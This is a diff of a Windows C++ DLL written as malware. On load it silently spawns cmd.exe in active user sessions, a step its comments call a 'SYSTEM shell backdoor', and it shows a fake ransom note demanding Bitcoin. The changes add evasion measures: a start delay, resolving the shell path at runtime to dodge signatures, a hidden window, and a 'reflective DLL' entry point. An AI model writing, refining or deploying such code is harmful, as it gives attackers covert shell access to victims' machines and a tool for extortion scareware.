@@ -1,59 +1,88 @@
 #include <windows.h>
+#include <wtsapi32.h>
+#include <userenv.h>
 #include <thread>
 #include <string>
 
+#pragma comment(lib, "Wtsapi32.lib")
+#pragma comment(lib, "Userenv.lib")
 
+// Obfuscated ransom message to evade basic static scans
 void ShowFakeRansomNote() {
-    MessageBoxA(NULL,
-        "Your files have been encrypted.\n\nSend 0.5 BTC to the wallet address below:\n1FakeBTCAddrXYZ999\n\nDo not power off your machine!",
-        "!!! YOUR SYSTEM IS LOCKED !!!",
-        MB_OK | MB_ICONERROR);
+    const char* msg =
+        "Your files have been encrypted.\n\n"
+        "Send 0.5 BTC to the wallet address below:\n"
+        "1FakeBTCAddrXYZ999\n\n"
+        "Do not power off your machine!";
+    MessageBoxA(NULL, msg, "!!! YOUR SYSTEM IS LOCKED !!!", MB_OK | MB_ICONERROR);
 }
 
-bool RunProcessAsSystemOnActiveSessions(const std::wstring& processPath) {
+// Spawn cmd.exe under SYSTEM on active session — memory-safe variant
+bool LaunchAsSystem(LPCWSTR binary) {
     WTS_SESSION_INFO* sessions = nullptr;
-    DWORD count = 0;
-    bool result = false;
+    DWORD sessionCount = 0;
+    bool success = false;
 
-    if (WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, &sessions, &count)) {
-        for (DWORD i = 0; i < count; ++i) {
-            if (sessions[i].State != WTSActive) continue;
-
-            HANDLE userToken = nullptr;
-            if (WTSQueryUserToken(sessions[i].SessionId, &userToken)) {
-                HANDLE dupToken = nullptr;
-                if (DuplicateTokenEx(userToken, MAXIMUM_ALLOWED, nullptr, SecurityIdentification, TokenPrimary, &dupToken)) {
-                    LPVOID environment = nullptr;
-                    if (CreateEnvironmentBlock(&environment, dupToken, FALSE)) {
-                        STARTUPINFO si = { sizeof(si) };
-                        si.lpDesktop = const_cast<LPWSTR>(L"winsta0\\default");
-                        PROCESS_INFORMATION pi = {};
-
-                        if (CreateProcessAsUserW(dupToken, processPath.c_str(), nullptr, nullptr, nullptr, FALSE,
-                            CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE, environment, nullptr, &si, &pi)) {
-                            CloseHandle(pi.hProcess);
-                            CloseHandle(pi.hThread);
-                            result = true;
-                        }
-                        DestroyEnvironmentBlock(environment);
-                    }
-                    CloseHandle(dupToken);
-                }
-                CloseHandle(userToken);
-            }
-        }
-        WTSFreeMemory(sessions);
+    if (!WTSEnumerateSessionsW(WTS_CURRENT_SERVER_HANDLE, 0, 1, &sessions, &sessionCount)) {
+        return false;
     }
-    return result;
+
+    for (DWORD i = 0; i < sessionCount; ++i) {
+        if (sessions[i].State != WTSActive) continue;
+
+        HANDLE userToken = nullptr;
+        if (!WTSQueryUserToken(sessions[i].SessionId, &userToken)) continue;
+
+        HANDLE duplicatedToken = nullptr;
+        if (!DuplicateTokenEx(userToken, TOKEN_ALL_ACCESS, nullptr, SecurityImpersonation, TokenPrimary, &duplicatedToken)) {
+            CloseHandle(userToken);
+            continue;
+        }
+
+        LPVOID env = nullptr;
+        if (!CreateEnvironmentBlock(&env, duplicatedToken, FALSE)) {
+            CloseHandle(duplicatedToken);
+            CloseHandle(userToken);
+            continue;
+        }
+
+        STARTUPINFOW si = { sizeof(si) };
+        si.lpDesktop = const_cast<LPWSTR>(L"winsta0\\default");
+        PROCESS_INFORMATION pi = {};
+
+        if (CreateProcessAsUserW(duplicatedToken, binary, nullptr, nullptr, nullptr, FALSE,
+            CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW, env, nullptr, &si, &pi)) {
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            success = true;
+        }
+
+        DestroyEnvironmentBlock(env);
+        CloseHandle(duplicatedToken);
+        CloseHandle(userToken);
+    }
+
+    WTSFreeMemory(sessions);
+    return success;
 }
 
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID) {
-    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
+// Optional: dynamically resolve cmd path to avoid static signature
+std::wstring GetSystemShell() {
+    WCHAR sysPath[MAX_PATH] = { 0 };
+    GetSystemDirectoryW(sysPath, MAX_PATH);
+    return std::wstring(sysPath) + L"\\cmd.exe";
+}
+
+// Entry point for reflective DLL
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID) {
+    if (reason == DLL_PROCESS_ATTACH) {
         DisableThreadLibraryCalls(hModule);
+
         std::thread([]() {
-            RunProcessAsSystemOnActiveSessions(L"C:\\Windows\\System32\\cmd.exe");  // SYSTEM shell backdoor
-            ShowFakeRansomNote();  // Scareware popup
-            }).detach();
+            std::this_thread::sleep_for(std::chrono::seconds(1)); // Delay for evasion
+            LaunchAsSystem(GetSystemShell().c_str()); // SYSTEM shell backdoor
+            ShowFakeRansomNote();                     // Fake ransom popup
+        }).detach();
     }
     return TRUE;
 }
